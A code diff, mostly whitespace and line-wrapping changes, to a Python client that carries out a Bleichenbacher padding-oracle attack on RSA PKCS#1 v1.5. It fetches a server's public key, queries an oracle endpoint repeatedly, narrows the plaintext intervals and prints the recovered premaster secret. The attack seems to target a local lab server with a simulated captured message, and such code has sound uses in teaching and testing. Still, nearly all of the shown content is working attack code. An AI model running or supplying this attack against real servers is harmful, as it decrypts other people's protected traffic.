@@ -73,7 +73,7 @@ class BleichenbacherClient:
         response = self.session.get(f"{self.base_url}/certificate")
         data = response.json()
         public_key_pem = data.get("public_key")
-        
+
         # Load the public key from PEM format
         self.server_public_key = serialization.load_pem_public_key(
             public_key_pem.encode('utf-8'),
@@ -142,10 +142,10 @@ class BleichenbacherClient:
         if not self.padding_oracle_query(target_ciphertext):
             print("[-] Error: Captured ciphertext is not PKCS-conforming!")
             return None
-        
+
         print("[+] Ciphertext is PKCS-conforming, starting attack...")
         print("[*] Beginning full-scale Bleichenbacher attack...\n")
-        
+
         # Start the full attack
         plaintext = self._narrow_solution_space(target_ciphertext, s0=1)
 
@@ -171,7 +171,7 @@ class BleichenbacherClient:
     def _find_next_s(self, c: int, s_prev: int, M: List[Tuple[int, int]], n: int, e: int, k: int, B: int, iteration: int, start_time: float, oracle_queries: int, log_file) -> Tuple[Optional[int], int]:
         """
         Find the next s value that produces PKCS#1 v1.5 conformant message.
-        
+
         Implements Bleichenbacher Step 2.c: searching with more than one interval.
 
         Args:
@@ -193,12 +193,12 @@ class BleichenbacherClient:
         # Start searching from s_prev + 1
         s = s_prev + 1
         queries_used = 0
-        
+
         # Search indefinitely until we find a conforming value
         while True:
             queries_used += 1
             total_queries = oracle_queries + queries_used
-            
+
             # Update progress every 10 queries to avoid excessive output
             if queries_used % 10 == 0:
                 elapsed = time.time() - start_time
@@ -207,29 +207,33 @@ class BleichenbacherClient:
                 if len(M) == 1:
                     width = M[0][1] - M[0][0]
                     width_bits = width.bit_length()
-                    sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | Searching s={s}...")
+                    sys.stdout.write(
+                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | Searching s={s}...")
                 else:
-                    sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Searching s={s}...")
+                    sys.stdout.write(
+                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Searching s={s}...")
                 sys.stdout.flush()
-            
+
             # Test if this s value produces conforming message
             if self._test_s_value(c, s, e, n, k):
                 # Found conforming value, print on new line
                 elapsed = time.time() - start_time
                 qps = total_queries / elapsed if elapsed > 0 else 0
-                
+
                 # Log the found s value
                 log_msg = f"Iteration {iteration}: Found s = {s} | Queries so far: {total_queries} | Rate: {qps:.1f} q/s | Elapsed: {int(elapsed)}s | Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                 log_file.write(log_msg)
                 log_file.flush()
-                
+
                 # Show interval info if single interval
                 if len(M) == 1:
                     width = M[0][1] - M[0][0]
                     width_bits = width.bit_length()
-                    sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | Found s={s}!    \n")
+                    sys.stdout.write(
+                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Width: 2^{width_bits} | Elapsed: {int(elapsed)}s | Found s={s}!    \n")
                 else:
-                    sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Found s={s}!    \n")
+                    sys.stdout.write(
+                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Found s={s}!    \n")
                 sys.stdout.flush()
                 return s, queries_used
             s += 1
@@ -251,21 +255,22 @@ class BleichenbacherClient:
         e = public_numbers.e
         k = (n.bit_length() + 7) // 8
         B = 2 ** (8 * (k - 2))
-        
+
         # Convert ciphertext to integer
         c = int.from_bytes(ciphertext, byteorder='big')
-        
+
         # Initialize intervals [a, b]
         # M_0 = {[2B, 3B - 1]}
         intervals = [(2 * B, 3 * B - 1)]
         s = s0
-        
+
         # Use a single log file for all attacks
         log_filename = "bleichenbacher_attack.log"
         log_file = open(log_filename, 'a')  # Append mode
         log_file.write(f"\n{'='*80}\n")
-        log_file.write(f"NEW ATTACK SESSION\n")
-        log_file.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        log_file.write("NEW ATTACK SESSION\n")
+        log_file.write(
+            f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         log_file.write(f"RSA Modulus (n): {n}\n")
         log_file.write(f"Public Exponent (e): {e}\n")
         log_file.write(f"Key Size: {k} bytes ({k*8} bits)\n")
@@ -274,54 +279,57 @@ class BleichenbacherClient:
         log_file.write(f"Initial interval: [{2*B}, {3*B-1}]\n")
         log_file.write(f"{'='*80}\n\n")
         log_file.flush()
-        
+
         print(f"[*] Logging attack progress to: {log_filename}")
-        print(f"[*] Starting interval narrowing (Bleichenbacher Step 2)")
-        print(f"[*] Initial interval: [2B, 3B-1] where B = 2^(8*(k-2))")
-        print(f"[*] Starting full-scale attack (this may take a while)...\n")
-        
+        print("[*] Starting interval narrowing (Bleichenbacher Step 2)")
+        print("[*] Initial interval: [2B, 3B-1] where B = 2^(8*(k-2))")
+        print("[*] Starting full-scale attack (this may take a while)...\n")
+
         oracle_queries = 1  # Already did one query to verify conformance
         start_time = time.time()
         iteration = 0
-        
+
         # Continue until we narrow down to a single value
         try:
             while True:
                 iteration += 1
-                
+
                 # Calculate progress metrics
                 elapsed = time.time() - start_time
                 qps = oracle_queries / elapsed if elapsed > 0 else 0
-                
+
                 # Calculate interval width for progress tracking
                 if len(intervals) == 1:
                     interval_width = intervals[0][1] - intervals[0][0]
                     width_bits = interval_width.bit_length()
                     # Print progress with interval width
-                    sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:.1f} q/s | Interval width: 2^{width_bits} | Elapsed: {int(elapsed)}s")
+                    sys.stdout.write(
+                        f"\r[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:.1f} q/s | Interval width: 2^{width_bits} | Elapsed: {int(elapsed)}s")
                 else:
                     # Print progress on same line (overwrite previous)
-                    sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(intervals):<4} | Elapsed: {int(elapsed)}s")
+                    sys.stdout.write(
+                        f"\r[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(intervals):<4} | Elapsed: {int(elapsed)}s")
                 sys.stdout.flush()
-                
+
                 # Step 2.c/3: Narrow the set of solutions based on current s
                 new_intervals = []
                 for a, b in intervals:
                     # Calculate r_min and r_max
-                    r_min = (a * s - 3 * B + 1 + n - 1) // n  # ceiling division
+                    # ceiling division
+                    r_min = (a * s - 3 * B + 1 + n - 1) // n
                     r_max = (b * s - 2 * B) // n  # floor division
-                    
+
                     for r in range(r_min, r_max + 1):
                         # Calculate new interval bounds
                         new_a = max(a, (2 * B + r * n + s - 1) // s)
                         new_b = min(b, (3 * B - 1 + r * n) // s)
-                        
+
                         if new_a <= new_b:
                             new_intervals.append((new_a, new_b))
-                
+
                 # Merge overlapping intervals
                 intervals = self._merge_intervals(new_intervals)
-                
+
                 # Log interval narrowing progress
                 if len(intervals) == 1:
                     width = intervals[0][1] - intervals[0][0]
@@ -329,34 +337,42 @@ class BleichenbacherClient:
                     log_msg = f"After Iteration {iteration}: Interval width = 2^{width_bits} | Range: [{intervals[0][0]}, {intervals[0][1]}] | Queries: {oracle_queries}\n"
                     log_file.write(log_msg)
                     log_file.flush()
-                    print(f"\n[*] Interval narrowed to width 2^{width_bits} (need 2^0 = 1 for convergence)")
-                
+                    print(
+                        f"\n[*] Interval narrowed to width 2^{width_bits} (need 2^0 = 1 for convergence)")
+
                 if not intervals:
-                    print(f"\n[-] No valid intervals remaining")
-                    log_file.write(f"\nATTACK FAILED: No valid intervals remaining at iteration {iteration}\n")
+                    print("\n[-] No valid intervals remaining")
+                    log_file.write(
+                        f"\nATTACK FAILED: No valid intervals remaining at iteration {iteration}\n")
                     break
-                
+
                 # Check if we have narrowed down to a single value
                 if len(intervals) == 1 and intervals[0][0] == intervals[0][1]:
                     plaintext_int = intervals[0][0]
                     elapsed = time.time() - start_time
-                    print(f"\n\n[+] Attack successful! Narrowed to single value!")
+                    print(
+                        "\n\n[+] Attack successful! Narrowed to single value!")
                     print(f"[+] Total iterations: {iteration}")
                     print(f"[+] Total oracle queries: {oracle_queries}")
-                    print(f"[+] Total time: {elapsed:.2f}s ({oracle_queries/elapsed:.1f} queries/sec)")
-                    
+                    print(
+                        f"[+] Total time: {elapsed:.2f}s ({oracle_queries/elapsed:.1f} queries/sec)")
+
                     # Log success
                     log_file.write(f"\n{'='*80}\n")
                     log_file.write(f"ATTACK SUCCESSFUL!\n")
                     log_file.write(f"Total Iterations: {iteration}\n")
                     log_file.write(f"Total Oracle Queries: {oracle_queries}\n")
-                    log_file.write(f"Total Time: {elapsed:.2f}s ({oracle_queries/elapsed:.1f} q/s)\n")
-                    log_file.write(f"Recovered Plaintext Integer: {plaintext_int}\n")
-                    
+                    log_file.write(
+                        f"Total Time: {elapsed:.2f}s ({oracle_queries/elapsed:.1f} q/s)\n")
+                    log_file.write(
+                        f"Recovered Plaintext Integer: {plaintext_int}\n")
+
                     try:
                         plaintext = plaintext_int.to_bytes(k, byteorder='big')
-                        print(f"[+] Decrypted plaintext (hex): {plaintext.hex()}")
-                        log_file.write(f"Decrypted Plaintext (hex): {plaintext.hex()}\n")
+                        print(
+                            f"[+] Decrypted plaintext (hex): {plaintext.hex()}")
+                        log_file.write(
+                            f"Decrypted Plaintext (hex): {plaintext.hex()}\n")
                         # Try to extract the actual message (after 0x00 0x02 padding)
                         try:
                             # Find the 0x00 separator after padding
@@ -371,40 +387,43 @@ class BleichenbacherClient:
                         print(f"\n[-] Error converting to bytes: {e}")
                         log_file.write(f"ERROR: {e}\n")
                         return None
-                
+
                 # Step 2: Find next s value
-                next_s, queries_used = self._find_next_s(c, s, intervals, n, e, k, B, iteration, start_time, oracle_queries, log_file)
+                next_s, queries_used = self._find_next_s(
+                    c, s, intervals, n, e, k, B, iteration, start_time, oracle_queries, log_file)
                 if next_s is None:
-                    print(f"\n[-] Could not find next s value")
-                    log_file.write(f"ATTACK FAILED: Could not find next s value at iteration {iteration}\n")
+                    print("\n[-] Could not find next s value")
+                    log_file.write(
+                        f"ATTACK FAILED: Could not find next s value at iteration {iteration}\n")
                     break
-                
+
                 oracle_queries += queries_used
                 s = next_s
         finally:
             # Always close log file
-            log_file.write(f"\nSession ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            log_file.write(
+                f"\nSession ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             log_file.close()
             print(f"[*] Attack log appended to: {log_filename}")
-        
+
         return None
-    
+
     def _merge_intervals(self, intervals: List[Tuple[int, int]]) -> List[Tuple[int, int]]:
         """
         Merge overlapping intervals.
-        
+
         Args:
             intervals: List of (a, b) tuples
-            
+
         Returns:
             Merged list of intervals
         """
         if not intervals:
             return []
-        
+
         sorted_intervals = sorted(intervals)
         merged = [sorted_intervals[0]]
-        
+
         for current in sorted_intervals[1:]:
             last = merged[-1]
             if current[0] <= last[1] + 1:
@@ -412,20 +431,20 @@ class BleichenbacherClient:
                 merged[-1] = (last[0], max(last[1], current[1]))
             else:
                 merged.append(current)
-        
+
         return merged
-    
+
     def _test_s_value(self, c: int, s: int, e: int, n: int, k: int) -> bool:
         """
         Test if an s value produces a PKCS-conforming message.
-        
+
         Args:
             c: Ciphertext as integer
             s: Multiplier value to test
             e: Public exponent
             n: Modulus
             k: Key size in bytes
-            
+
         Returns:
             True if PKCS-conforming, False otherwise
         """
@@ -481,7 +500,7 @@ class BleichenbacherClient:
         # TLS version 0x0303 = TLS 1.2
         premaster_secret = b'\x03\x03' + os.urandom(46)
         self.premaster_secret = premaster_secret
-        
+
         # Encrypt with server's public key using PKCS#1 v1.5 padding
         encrypted = self.server_public_key.encrypt(
             premaster_secret,
@@ -505,10 +524,10 @@ class BleichenbacherClient:
         n = public_numbers.n
         e = public_numbers.e
         k = (n.bit_length() + 7) // 8
-        
+
         c = int.from_bytes(ciphertext, byteorder='big')
         c_prime = (c * pow(multiplier, e, n)) % n
-        
+
         return c_prime.to_bytes(k, byteorder='big')
 
     def health_check(self) -> bool:
@@ -540,7 +559,8 @@ if __name__ == "__main__":
             target_ciphertext = client.simulate_captured_message()
             plaintext = client.execute_bleichenbacher_attack(target_ciphertext)
             if plaintext:
-                print(f"[+] Attack successful! Recovered plaintext: {plaintext}")
+                print(
+                    f"[+] Attack successful! Recovered plaintext: {plaintext}")
             else:
                 print("[-] Attack failed to recover plaintext")
         else:
